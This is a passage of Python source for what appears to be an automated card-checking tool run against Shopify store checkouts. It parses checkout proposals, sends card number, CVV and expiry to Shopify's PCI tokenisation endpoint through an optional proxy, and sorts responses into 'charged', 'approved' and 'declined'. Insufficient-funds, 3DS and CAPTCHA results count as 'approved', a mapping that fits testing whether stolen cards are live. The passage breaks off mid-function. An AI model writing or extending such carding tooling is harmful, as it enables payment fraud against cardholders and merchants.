    "VUV": "VU", "KPW": "KP", "MOP": "MO", "BND": "BN", "KID": "KI",
    "STN": "ST", "CVE": "CV", "MRU": "MR", "SOS": "SO", "DJF": "DJ",
    "ERN": "ER", "KMF": "KM", "BIF": "BI", "MWK": "MW",
}

_RE_CURRENCY_CART = re.compile(r'"currency"\s*:\s*"([A-Z]{3})"')

def fetch_shop_currency_sync(client, shop_url: str, headers=None) -> Tuple[str, str]:
    def _apply(cur):
        return cur, CURRENCY_TO_COUNTRY.get(cur, "US")

    for path in ("/meta.json", "/cart.js"):
        try:
            resp = client.get(f"{shop_url}{path}", timeout=10)
            if resp and resp.status_code == 200:
                if path == "/meta.json":
                    cur = str((resp.json().get("currency") or "")).strip().upper()
                else:
                    m = _RE_CURRENCY_CART.search(resp.text)
                    cur = m.group(1).upper() if m else ""
                if len(cur) == 3:
                    return _apply(cur)
        except Exception:
            continue
    return "USD", "US"

# ── Gateway extraction ──
_GATEWAY_PATTERNS = [
    re.compile(r'"paymentMethodIdentifier"\s*:\s*"[^"]*"\s*,\s*"name"\s*:\s*"([^"]+)"'),
    re.compile(r'"name"\s*:\s*"([^"]+)"\s*,\s*"paymentMethodIdentifier"'),
    re.compile(r'"extensibilityDisplayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"providerDisplayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"paymentProvider"\s*:\s*\{"name"\s*:\s*"([^"]+)"'),
    re.compile(r'"gatewayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"paymentGateway"\s*:\s*"([^"]+)"'),
    re.compile(r'"availablePaymentLines".*?"displayName"\s*:\s*"([^"]+)"'),
]

def extract_gateway_name(*bodies: str) -> str:
    for body in bodies:
        if not body:
            continue
        for pat in _GATEWAY_PATTERNS:
            m = pat.search(body)
            if m:
                name = m.group(1).strip()
                if name:
                    return name
    return "Shopify Payments"

def extract_delivery_from_proposal(proposal_json: str) -> Tuple[str, str]:
    try:
        delivery = _seller_proposal(proposal_json).get("delivery") or {}
        if not isinstance(delivery, dict):
            return "", ""

        lines = delivery.get("deliveryLines") or []
        if not isinstance(lines, list):
            return "", ""

        strats: list = []
        for line in lines:
            if not isinstance(line, dict):
                continue
            found = line.get("availableDeliveryStrategies") or []
            if isinstance(found, list):
                strats.extend([s for s in found if isinstance(s, dict)])

        if not strats:
            return "", ""

        def _price(strategy: dict) -> float:
            try:
                raw = (strategy.get("amount", {}) or {}).get("value", {}) or {}
                return float(raw.get("amount"))
            except (TypeError, ValueError, AttributeError):
                return 0.0

        best = min(strats, key=_price)
        handle = str(best.get("handle") or "")
        amount = ((best.get("amount", {}) or {}).get("value", {}) or {}).get("amount", "")
        return handle, str(amount) if amount not in (None, "") else "0.00"
    except Exception:
        return "", ""

def is_delivery_unavailable(proposal_json: str) -> bool:
    delivery = _seller_proposal(proposal_json).get("delivery") or {}
    if not isinstance(delivery, dict):
        return False
    if delivery.get("__typename") in ("UnavailableTerms", "EmptyDeliveryTerms"):
        return True
    lines = delivery.get("deliveryLines")
    if isinstance(lines, list):
        for line in lines:
            if not isinstance(line, dict):
                continue
            if line.get("availableDeliveryStrategies"):
                return False
        return True
    return False


def resolve_delivery(proposal_json: str) -> Tuple[str, str, bool]:
    handle, amount = extract_delivery_from_proposal(proposal_json)
    if not handle:
        handle = extract_delivery_handle(proposal_json)

    is_digital = not extract_is_shipping_required(proposal_json)
    needs_delivery = not (is_digital or is_delivery_unavailable(proposal_json))

    if not handle:
        return "", amount, needs_delivery
    if not amount:
        amount = extract_shipping_amount(proposal_json)
    if not amount:
        amount = "0.00"
    return handle, amount, needs_delivery


def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        seller       = _seller_proposal(proposal_json)
        de          = seller.get("deliveryExpectations", {})
        de_typename = de.get("__typename", "")

        if de_typename == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]

        if "deliveryExpectations" in de:
            expectations = de.get("deliveryExpectations", [])
            if isinstance(expectations, list):
                handles = [x.get("signedHandle") for x in expectations if x.get("signedHandle")]
                if handles:
                    return handles

        if de_typename in ["UnfilledDeliveryExpectationTerms", "UnavailableTerms"]:
            return []

    except Exception:
        pass
    return []

def extract_shipping_amount(proposal_body: str) -> str:
    match = re.search(
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""

def _seller_proposal(body: str) -> dict:
    try:
        data = json.loads(body)
    except Exception:
        return {}
    if not isinstance(data, dict):
        return {}
    candidates = (
        data.get("data", {}).get("session", {}) if isinstance(data.get("data"), dict) else {},
        data.get("session", {}) if isinstance(data.get("session"), dict) else {},
        data,
    )
    for root in candidates:
        if not isinstance(root, dict):
            continue
        node = root
        for key in ("negotiate", "result", "sellerProposal"):
            nxt = node.get(key) if isinstance(node, dict) else None
            if not isinstance(nxt, dict):
                node = None
                break
            node = nxt
        if isinstance(node, dict) and node:
            return node
    return {}

def _money_amount(node) -> str:
    if not isinstance(node, dict) or node.get("__typename") == "AnyConstraint":
        return ""
    val = node.get("value")
    if isinstance(val, dict) and val.get("amount") not in (None, ""):
        return str(val["amount"])
    return ""

def extract_checkout_total(proposal_body: str) -> str:
    return _money_amount(_seller_proposal(proposal_body).get("checkoutTotal"))

def extract_seller_total(proposal_body: str) -> str:
    return _money_amount(_seller_proposal(proposal_body).get("total"))

def extract_running_total(proposal_json: str) -> str:
    return _money_amount(_seller_proposal(proposal_json).get("runningTotal"))

def _deep_find_id(obj, key: str) -> str:
    if isinstance(obj, dict):
        node = obj.get(key)
        if isinstance(node, dict) and node.get("id"):
            return str(node["id"])
        for v in obj.values():
            got = _deep_find_id(v, key)
            if got:
                return got
    elif isinstance(obj, list):
        for v in obj:
            got = _deep_find_id(v, key)
            if got:
                return got
    return ""

def _deep_find_template(body: str) -> Tuple[str, str]:
    try:
        data = json.loads(body)
    except Exception:
        return "", ""
    node = _deep_find_template_obj(data, "paymentFlexibilityPaymentTermsTemplate")
    if not isinstance(node, dict) or not node.get("id"):
        return "", ""
    return str(node["id"]), str(node.get("type", "") or "")

def _deep_find_template_obj(obj, key: str):
    if isinstance(obj, dict):
        if isinstance(obj.get(key), dict) and obj[key].get("id"):
            return obj[key]
        for v in obj.values():
            got = _deep_find_template_obj(v, key)
            if got:
                return got
    elif isinstance(obj, list):
        for v in obj:
            got = _deep_find_template_obj(v, key)
            if got:
                return got
    return None

def extract_payment_flexibility_terms_id(body: str) -> str:
    return _deep_find_template(body)[0]

def extract_payment_flexibility_terms_type(body: str) -> str:
    return _deep_find_template(body)[1]

def extract_seller_merchandise_price(proposal_body: str) -> str:
    match = re.search(
        r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""

def extract_seller_currency(proposal_body: str) -> str:
    match = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_country(proposal_body: str) -> str:
    match = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_tax_amount(proposal_json: str) -> str:
    try:
        val = (_seller_proposal(proposal_json)
                   .get("tax", {})
                   .get("totalTaxAmount", {})
                   .get("value", {}))
        return val.get("amount", "0.0")
    except Exception:
        return "0.0"

def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        return (seller.get("tax", {})
                      .get("totalTaxAmount", {})
                      .get("value", {})
                      .get("amount", "0.0"))
    except Exception:
        return "0.0"

def extract_rejected_totals(submit_json: str) -> Tuple[str, str]:
    try:
        data   = json.loads(submit_json)
        d      = data.get("data", {}) if isinstance(data, dict) else {}
        seller = ((d.get("submitForCompletion") or {}).get("sellerProposal")
                  if isinstance(d, dict) else None)
        if not seller:
            seller = _seller_proposal(submit_json)
        seller = seller or {}
        total = ""
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                total = val
                break
        tax = (seller.get("tax", {})
                    .get("totalTaxAmount", {})
                    .get("value", {})
                    .get("amount", ""))
        return total, tax
    except Exception:
        return "", ""

def extract_pending_poll_delay(submit_body: str, default: float = 1.2) -> float:
    for pat in (r'"pollDelay"\s*:\s*(\d+)',
                r'"progressiveRatesEstimatedTimeUntilCompletion"\s*:\s*(\d+)'):
        m = re.search(pat, submit_body)
        if m:
            try:
                return max(0.0, min(int(m.group(1)) / 1000.0, 3.0))
            except (TypeError, ValueError):
                break
    return default

def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
        return ""
    except Exception:
        return ""

_RECEIPT_GID_TYPED_RE = re.compile(
    r'"id"\s*:\s*"(gid://shopify/[A-Za-z_]*Receipt[A-Za-z_]*/[^"]+)"')
_RECEIPT_GID_ANY_RE = re.compile(
    r'"id"\s*:\s*"(gid://shopify/[A-Za-z_-]+/[^"]+)"')
_RECEIPT_BARE_ID_RE = re.compile(
    r'"(?:receipt)?[Ii]d"\s*:\s*"([0-9]{6,})"')


def extract_receipt_id(submit_body: str) -> str:
    body = submit_body or ""
    for pattern in (_RECEIPT_GID_TYPED_RE, _RECEIPT_GID_ANY_RE):
        match = pattern.search(body)
        if match:
            return match.group(1)
    match = _RECEIPT_BARE_ID_RE.search(body)
    if match:
        return match.group(1)
    return ""

def extract_receipt_session_token(submit_body: str) -> str:
    match = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""

def extract_any_error(submit_body: str) -> str:
    for pattern in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        match = re.search(pattern, submit_body)
        if match:
            return match.group(1)
    return ""


_SUBMIT_SUCCESS_HINTS = (
    r'"__typename"\s*:\s*"SubmitSuccess"',
    r'"__typename"\s*:\s*"SubmitAlreadyAccepted"',
    r'"__typename"\s*:\s*"[A-Za-z_]*Receipt[A-Za-z_]*"',
    r'"orderStatusPageUrl"\s*:\s*"https?://',
    r'"status"\s*:\s*"processed"',
    r'"status"\s*:\s*"polling_for_order"',
)


def submit_body_reports_success(submit_body: str) -> bool:
    body = submit_body or ""
    return any(re.search(p, body) for p in _SUBMIT_SUCCESS_HINTS)


def no_code_failure(submit_body: str) -> tuple:
    """No machine-readable code at all. Report an unknown retryable error —
    never fabricate a success and never fabricate a decline."""
    return "UNKNOWN_ERROR", True

# ── Card result classification ────────────────────────────────────────────
CARD_RESULT_MAP = {
    # ── outcomes ──
    "ORDER_PAID":        "ORDER_PAID",
    "ORDER_PLACED":      "ORDER_PAID",
    "PROCESSING":        "PROCESSING",

    # ── 3-D Secure: card is fine, buyer must finish a challenge ──
    "3DS_REQUIRED":            "3DS_REQUIRED",
    "AUTHENTICATION_REQUIRED": "3DS_REQUIRED",

    # A 3DS challenge the issuer refused.
    "3DS_FAILED":              "3DS_FAILED",
    "AUTHENTICATION_ERROR":    "3DS_FAILED",
    "AUTHENTICATION_FAILED":   "3DS_FAILED",

    # ── declined ──
    "CARD_DECLINED":     "CARD_DECLINED",
    "DECLINED":          "CARD_DECLINED",
    "PAYMENT_DECLINED":  "CARD_DECLINED",

    # ── browser interaction required ──
    "CAPTCHA_REQUIRED":  "CARD_DECLINED",
    "CAPTCHA":           "CARD_DECLINED",
    "DECISION_RULE_BLOCK": "RISK_BLOCKED",
    "RISKY":             "RISK_BLOCKED",

    # ── processor reasons ──
    "INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
    "FRAUD_SUSPECTED":    "FRAUD_SUSPECTED",
    "STOLEN_CARD":        "STOLEN_CARD",
    "LOST_CARD":          "LOST_CARD",
    "EXPIRE_CARD":        "EXPIRE_CARD",
    "EXPIRED_CARD":       "EXPIRE_CARD",
    "INCORRECT_CVC":      "INCORRECT_CVC",
    "INCORRECT_ZIP":      "INCORRECT_CVC",
    "DO_NOT_HONOR":       "DO_NOT_HONOR",

    # ── order not processed ──
    "GENERIC_ERROR":      "GENERIC_ERROR",

    # ── checkout-integration faults ──
    "CHECKOUT_RETRYABLE": "CHECKOUT_RETRYABLE",
}

DECLINED_RESULTS = frozenset({
    "CARD_DECLINED", "INSUFFICIENT_FUNDS", "FRAUD_SUSPECTED",
    "STOLEN_CARD", "LOST_CARD", "EXPIRE_CARD", "INCORRECT_CVC",
    "DO_NOT_HONOR",
    "3DS_FAILED",
})


SHOPIFY_CODE_CATEGORY = {
    "AMOUNT_TOO_SMALL":            "amount_too_small",
    "AUTHENTICATION_ERROR":        "three_d_secure_failed",
    "3DS_FAILED":                  "three_d_secure_failed",
    "AUTHENTICATION_FAILED":       "three_d_secure_failed",
    "AUTHENTICATION_REQUIRED":     "authentication_required",
    "AUTHORIZATION_ERROR":         "processing_error",
    "CALL_ISSUER":                 "call_issuer",
    "CANCELED_PAYPAL_BILLING_AGREEMENT": "processing_error",
    "CANCELLED_PAYMENT":           "cancelled_payment",
    "CARD_DECLINED":               "card_declined",
    "CVV_ATTEMPTS_EXCEEDED":       "cvv_attempts_exceeded",
    "CUSTOM_REDEEMABLE_NO_LONGER_AVAILABLE": "custom_redeemable_no_longer_available",
    "DECISION_RULE_BLOCK":         "generic_error",
    "EXPIRED_BUYER_ACTION":        "expired_buyer_action",
    "EXPIRED_CARD":                "expired_card",
    "FUNDING_ERROR":               "processing_error",
    "INCORRECT_ADDRESS":           "cannot_verify",
    "INCORRECT_CVC":               "cannot_verify",
    "INCORRECT_NUMBER":            "cannot_verify",
    "INCORRECT_PIN":               "cannot_verify",
    "INCORRECT_ZIP":               "cannot_verify",
    "INSUFFICIENT_FUNDS":          "insufficient_funds",
    "INVALID_CURRENCY":            "processing_error",
    "INVALID_CVC":                 "invalid_cvc",
    "INVALID_EXPIRY_DATE":         "invalid_expiry_date",
    "INVALID_ITEM_TOTAL":          "processing_error",
    "INVALID_NUMBER":              "invalid_number",
    "INVALID_PAYMENT_METHOD":      "cannot_verify",
    "INVALID_SHIPPING_ADDRESS":    "invalid_shipping_address",
    "INVALID_TOKEN":               "processing_error",
    "INVOICE_ALREADY_PAID":        "processing_error",
    "MISSING_SHIPPING_ADDRESS":    "missing_shipping_address",
    "NAME_MISMATCH":               "name_mismatch",
    "PAYMENT_ABOVE_THRESHOLD":     "payment_above_threshold",
    "PAYMENT_METHOD_EXPIRED":      "payment_method_expired",
    "PICK_UP_CARD":                "pick_up_card",
    "PUBLIC_PAYMENT_ERROR":        "generic_error",
    "RISKY":                       "risky",
    "SHOP_PAY_DECLINED":           "processing_error_checkout_as_guest",
    "SUCCESSFUL_OFFSITE_WITH_GIFT_CARD_ERROR": "successful_offsite_with_gift_card_error",
    "TEST_MODE_LIVE_CARD":         "test_mode_live_card",
    "THIRD_PARTY_INTERNAL_ERROR":  "processing_error",
    "TOKEN_EXPIRED":               "processing_error",
    "TRANSIENT_ERROR":             "transient_error",
    "UNILATERAL_AUTH_ERROR":       "processing_error",
    "UNPROCESSABLE_TRANSACTION":   "processing_error",
    "CAPTCHA_REQUIRED":            "captcha_required",
}

SHOPIFY_DECLINE_CATEGORIES = frozenset({
    "amount_too_small", "call_issuer", "cancelled_payment", "card_declined",
    "cannot_verify", "cvv_attempts_exceeded", "expired_buyer_action",
    "expired_card", "insufficient_funds", "invalid_cvc",
    "invalid_expiry_date", "invalid_number", "invalid_shipping_address",
    "missing_shipping_address", "name_mismatch", "payment_above_threshold",
    "payment_method_expired", "pick_up_card", "risky", "test_mode_live_card",
    "three_d_secure_failed",
})

SHOPIFY_PENDING_CATEGORIES = frozenset({
    "captcha_required", "authentication_required",
})


def normalize_card_result(error_code: str) -> str:
    if not error_code:
        return "UNKNOWN_ERROR"

    code = str(error_code).strip().upper()

    # 3DS takes priority: not a decline, not an error.
    if code in ("AUTHENTICATION_REQUIRED", "3DS_REQUIRED"):
        return "3DS_REQUIRED"
    if code in ("AUTHENTICATION_ERROR", "AUTHENTICATION_FAILED", "3DS_FAILED"):
        return "3DS_FAILED"

    if "CAPTCHA" in code:
        return "CARD_DECLINED"

    flat = code.replace("_", " ")
    if ("TERMS ID MISMATCH" in flat or "PAYMENT FLEXIBILITY" in flat
            or "CHECKOUTRETRYABLE" in flat):
        return "CHECKOUT_RETRYABLE"

    if code in CARD_RESULT_MAP:
        return CARD_RESULT_MAP[code]

    head = re.split(r"[:\s]", code, 1)[0]
    if head in CARD_RESULT_MAP:
        return CARD_RESULT_MAP[head]
    return code


def result_status_for(code: str) -> CheckStatus:
    """CheckStatus for an already-normalised result code."""
    u = (code or "").strip().upper()

    # ── terminal outcomes ──
    if u == "ORDER_PAID":
        return CheckStatus.CHARGED

    # 3DS_REQUIRED gets its own status — never folded into APPROVED.
    if u in ("3DS_REQUIRED", "AUTHENTICATION_REQUIRED"):
        return CheckStatus.THREE_DS

    # A failed 3DS challenge is a completed negative answer.
    if u in ("3DS_FAILED", "AUTHENTICATION_ERROR", "AUTHENTICATION_FAILED"):
        return CheckStatus.DECLINED

    if u == "INSUFFICIENT_FUNDS":
        return CheckStatus.APPROVED

    if u in DECLINED_RESULTS:
        return CheckStatus.DECLINED

    if u == "CAPTCHA_REQUIRED":
        return CheckStatus.APPROVED

    category = SHOPIFY_CODE_CATEGORY.get(u)
    if category in SHOPIFY_PENDING_CATEGORIES:
        return CheckStatus.APPROVED
    if category in SHOPIFY_DECLINE_CATEGORIES:
        return CheckStatus.DECLINED
    return CheckStatus.ERROR


# ── c3.py-parity verdict classification ───────────────────────────────
#
# c3.py's _classify_verdict() recognises more of Shopify's raw vocabulary
# (failed receipts, OTP/3DS aliases, CVV/POSTAL/number reasons, fraud and
# risk blocks) than normalize_card_result() alone. Both surfaces now share
# this vocabulary so the Flask service and the orchestrator agree.

_VERDICT_3DS = (
    "ACTIONREQUIREDRECEIPT", "ACTION_REQUIRED", "ACTIONREQUIRED",
    "OTP_REQUIRED", "OTP", "AUTHENTICATION_REQUIRED",
    "COMPLETEPAYMENTCHALLENGE", "THREE_D_SECURE", "THREEDS",
)
_VERDICT_CVV = (
    "INCORRECT_CVC", "INVALID_CVC", "INCORRECT_CVV", "INVALID_CVV",
    "INCORRECT_SECURITY_CODE", "INVALID_SECURITY_CODE",
    "INCORRECT CVC", "INVALID CVC", "INCORRECT CVV", "INVALID CVV",
    "SECURITY CODE", "INVALID SECURITY CODE",
    "INCORRECTCVV", "INVALIDCVV", "INCORRECTCVC", "INVALIDCVC",
)
_VERDICT_ZIP = (
    "INCORRECT_ZIP", "INCORRECT_POSTAL", "INCORRECTZIP", "INCORRECTPOSTAL",
    "INCORRECT ZIP", "INCORRECT POSTAL", "INVALID ZIP", "INVALID POSTAL",
    "INVALID_ZIP", "INVALID_POSTAL", "INVALIDZIP", "INVALIDPOSTAL",
)
_VERDICT_INVALID_NUMBER = (
    "INCORRECT_NUMBER", "INVALID_NUMBER", "INCORRECT NUMBER", "INVALID NUMBER",
    "INCORRECTNUMBER", "INVALIDNUMBER",
)


def _classify_verdict(body: str = "") -> str:
    """c3.py-parity classifier: raw response body -> canonical verdict code.

    Superset of ``normalize_card_result()``. Used by the Flask service and by
    the orchestrator's fallback paths so every surface shares one vocabulary.
    Returns "" when nothing recognisable is found.
    """
    u = (body or "").upper()
    if ('"__TYPENAME":"PROCESSEDRECEIPT"' in u or '"__TYPENAME":"SUCCESSFULRECEIPT"' in u
            or '"__TYPENAME": "PROCESSEDRECEIPT"' in u
            or '"__TYPENAME": "SUCCESSFULRECEIPT"' in u):
        return "ORDER_PAID"
    if "FAILEDRECEIPT" in u or "PAYMENTFAILED" in u:
        m = re.search(r'"processingError"\s*:\s*\{\s*"code"\s*:\s*"([^"]+)"', body or "",
                      re.IGNORECASE)
        return m.group(1) if m else "CARD_DECLINED"
    if any(k in u for k in _VERDICT_3DS):
        return "3DS_REQUIRED"
    if "INSUFFICIENT" in u:
        return "INSUFFICIENT_FUNDS"
    if any(k in u for k in _VERDICT_CVV):
        return "INCORRECT_CVC"
    if any(k in u for k in _VERDICT_ZIP):
        return "INCORRECT_ZIP"
    if '"CODE":"CAPTCHA_REQUIRED"' in u or re.search(r'"captcha"\s*:\s*\{', body or "",
                                                      re.IGNORECASE):
        return "CAPTCHA_REQUIRED"
    if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in u:
        return "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT"
    if any(k in u for k in _VERDICT_INVALID_NUMBER):
        return "INCORRECT_NUMBER"
    if any(k in u for k in ("EXPIRED_CARD", "EXPIRE_CARD", "EXPIRED_CARD")):
        return "EXPIRE_CARD"
    if any(k in u for k in ("DO_NOT_HONOR", "DO NOT HONOR", "DONOTHONOR")):
        return "DO_NOT_HONOR"
    if any(k in u for k in ("STOLEN_CARD", "LOST_CARD", "PICK_UP_CARD")):
        return "STOLEN_CARD"
    if "FRAUD" in u:
        return "FRAUD_SUSPECTED"
    if any(k in u for k in ("RISK_REJECTED", "RISKY", "RISK_BLOCKED")):
        return "RISK_BLOCKED"
    if any(k in u for k in ("INVALID_CARD", "INVALID CARD", "INVALIDCARD")):
        return "INVALID_CARD"
    if any(k in u for k in ("PROCESSING_ERROR", "FUNDING_ERROR")):
        return "PROCESSING_ERROR"
    if any(k in u for k in ("CARD_DECLINED", "CARDDECLINED", "CARD DECLINED")) or "DECLINED" in u:
        return "CARD_DECLINED"
    return ""


def _verdict_status(code: str) -> str:
    """Map a canonical verdict code to a coarse status string (c3.py parity)."""
    if code == "ORDER_PAID":
        return "charged"
    if code in ("INSUFFICIENT_FUNDS", "3DS_REQUIRED", "CAPTCHA_REQUIRED"):
        return "approved"
    return "declined"


# ── Receipt classification ────────────────────────────────────────────

RECEIPT_SUCCESS_TYPES  = frozenset({"ProcessedReceipt", "SuccessfulReceipt"})
RECEIPT_FAILURE_TYPES  = frozenset({"FailedReceipt"})
RECEIPT_ACTION_TYPES   = frozenset({"ActionRequiredReceipt"})
RECEIPT_PENDING_TYPES  = frozenset({"ProcessingReceipt", "WaitingReceipt",
                                    "PollingForOrderReceipt"})
RECEIPT_RETRYABLE_TYPES = frozenset({"ReceiptNotFound"})

RECEIPT_TYPE_RE = re.compile(r'"__typename"\s*:\s*"([A-Za-z_]*Receipt[A-Za-z_]*)"')
RECEIPT_STATUS_RE = re.compile(
    r'"status"\s*:\s*"(processed|failed|processing|action_required|'
    r'polling_for_order|completed|success|paid)"')

# Body-level signals that the payment is stuck on a 3-D Secure challenge.
_THREE_DS_REQUIRED_RE = re.compile(
    r'"code"\s*:\s*"(AUTHENTICATION_REQUIRED|3DS_REQUIRED)"'
    r'|"challengeType"\s*:'
    r'|"CompletePaymentChallenge"'
    r'|"CompletePaymentChallengeV2"'
    r'|"challengeData"\s*:'
)
_THREE_DS_FAILED_RE = re.compile(
    r'"code"\s*:\s*"(AUTHENTICATION_ERROR|AUTHENTICATION_FAILED|3DS_FAILED)"'
)


def _body_3ds_signal(poll_body: str) -> str:
    body = poll_body or ""
    if _THREE_DS_FAILED_RE.search(body):
        return "failed"
    if _THREE_DS_REQUIRED_RE.search(body):
        return "required"
    return ""


def classify_receipt(poll_body: str, receipt_type: str = "") -> str:
    """One of: success, failure, three_ds_required, three_ds_failed,
    pending, retryable, unknown. Never returns "failure" for an
    unrecognised shape."""
    # A 3DS signal in the body beats the typename.
    ds = _body_3ds_signal(poll_body)
    if ds == "required":
        return "three_ds_required"
    if ds == "failed":
        return "three_ds_failed"

    if not receipt_type:
        found = RECEIPT_TYPE_RE.search(poll_body or "")
        if found:
            receipt_type = found.group(1)

    # c3.py parity: a failed payment is not always a "*Receipt" typename.
    if re.search(r'"__typename"\s*:\s*"PaymentFailed"', poll_body or ""):
        return "failure"

    if receipt_type in RECEIPT_SUCCESS_TYPES:
        return "success"
    if receipt_type in RECEIPT_FAILURE_TYPES:
        return "failure"
    if receipt_type in RECEIPT_ACTION_TYPES:
        return "three_ds_required"
    if receipt_type in RECEIPT_PENDING_TYPES:
        return "pending"
    if receipt_type in RECEIPT_RETRYABLE_TYPES:
        return "retryable"

    m = RECEIPT_STATUS_RE.search(poll_body or "")
    if m:
        st = m.group(1)
        if st in ("processed", "completed", "success", "paid"):
            return "success"
        if st == "failed":
            return "failure"
        if st == "action_required":
            return "three_ds_required"
        if st in ("processing", "polling_for_order"):
            return "pending"

    return "unknown"


def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    outcome = classify_receipt(poll_body, receipt_type)
    if outcome == "success":
        return "ORDER_PAID"
    if outcome == "three_ds_required":
        return "3DS_REQUIRED"
    if outcome == "three_ds_failed":
        return "3DS_FAILED"
    if outcome in ("pending", "retryable"):
        return "PROCESSING"
    if outcome == "unknown":
        return "UNKNOWN"
    # failure: prefer the raw Shopify code (c3.py parity), then the
    # processingError code, then a generic decline.
    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if match:
        return normalize_card_result(match.group(1))
    verdict = _classify_verdict(poll_body)
    if verdict:
        return verdict
    if "CAPTCHA" in poll_body:
        return "CARD_DECLINED"
    return "FAILED"

def detect_shipping_restriction(proposal_body: str) -> bool:
    restriction_signals = [
        "SHIPPING_ADDRESS_UNDELIVERABLE",
        "no_delivery_options_available",
        "noDeliveryOptionsAvailable",
        "delivery is not available",
        "does not ship to",
    ]
    lower = proposal_body.lower()
    return any(s.lower() in lower for s in restriction_signals)

# ──────────────────────── Payload helpers ────────────────────────────

_RE_PATCH_CURRENCY_CODE = re.compile(r'"currencyCode"\s*:\s*"[A-Z]{3}"')
_RE_PATCH_PRESENTMENT   = re.compile(r'"presentmentCurrency"\s*:\s*"[A-Z]{3}"')
_RE_PATCH_COUNTRY_CODE  = re.compile(r'"countryCode"\s*:\s*"[A-Z]{2}"')
_RE_PATCH_PHONE_COUNTRY = re.compile(r'"phoneCountryCode"\s*:\s*"[A-Z]{2}"')

def patch_payload(payload: str, currency: str, country: str) -> str:
    payload = _RE_PATCH_CURRENCY_CODE.sub(f'"currencyCode": "{currency}"', payload)
    payload = _RE_PATCH_PRESENTMENT.sub(f'"presentmentCurrency": "{currency}"', payload)
    payload = _RE_PATCH_COUNTRY_CODE.sub(f'"countryCode": "{country}"', payload)
    payload = _RE_PATCH_PHONE_COUNTRY.sub(f'"phoneCountryCode": "{country}"', payload)
    return payload

def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"

def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"

# ──────────────────────── Step 9: PCI tokenisation ───────────────────

_CVV4_PREFIXES = ("34", "37")


def cvv_length_for_pan(card_number: str) -> int:
    digits = re.sub(r"\D", "", card_number or "")
    return 4 if digits.startswith(_CVV4_PREFIXES) else 3


def cvv_matches_pan(card_number: str, cvv: str) -> bool:
    cvv = (cvv or "").strip()
    if not cvv or not cvv.isdigit():
        return False
    return len(cvv) == cvv_length_for_pan(card_number)


def _pci_error_reason(pci_body: str) -> str:
    body = pci_body or ""

    for field in ("verification_value", "payment", "card", "number",
                  "expiry", "cvc", "cvv", "errors"):
        m = re.search(r'"%s"\s*:\s*\[\s*"([^"]{1,220})"' % field, body)
        if m and m.group(1).strip():
            return m.group(1).strip()

    for pattern in (r'"message"\s*:\s*"([^"]{1,220})"',
                    r'"error_description"\s*:\s*"([^"]{1,220})"',
                    r'"error"\s*:\s*"([^"]{1,220})"'):
        m = re.search(pattern, body)
        if m and m.group(1).strip():
            return m.group(1).strip()

    compact = re.sub(r"\s+", " ", body).strip()
    return compact[:220] if compact else "(empty response body)"


_PCI_CARD_DECLINE_CODES = (
    "INVALID_PAYMENT_METHOD",
    "INCORRECT_NUMBER", "INCORRECT_CVC", "INCORRECT_PIN",
    "INCORRECT_ZIP", "INCORRECT_ADDRESS",
    "INVALID_NUMBER", "INVALID_EXPIRY_DATE", "INVALID_CVC", "EXPIRED_CARD",
)

_PCI_FAULT_CODES = (
    "PCI_ERROR", "THIRD_PARTY_INTERNAL_ERROR", "FUNDING_ERROR",
    "TOKEN_EXPIRED", "TOKEN_CARD_INVALID",
)


def classify_pci_rejection(pci_status: int, pci_body: str) -> str:
    body = (pci_body or "").upper()

    if "VERIFICATION_VALUE" in body or "INVALID_FOR_CARD_TYPE" in body:
        return "invalid_cvc"
    for code in _PCI_CARD_DECLINE_CODES:
        if code in body:
            return "card_declined"
    for code in _PCI_FAULT_CODES:
        if code in body:
            return "pci_error"
    return "unknown"


def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     card_month: int, card_year: int, cvv: str,
                     shop_domain: str, proxy_url: str = "") -> Tuple[int, str]:

    payload = json.dumps({
        "credit_card": {
            "number":             card_number,
            "month":              card_month,
            "year":               card_year,
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               card_name,
        },
        "payment_session_scope": shop_domain,
    })

    headers = {
        "accept":               "application/json",
        "accept-language":      "en-US,en;q=0.9",
        "content-type":         "application/json",
        "origin":               "https://checkout.pci.shopifyinc.com",
        "priority":             "u=1, i",
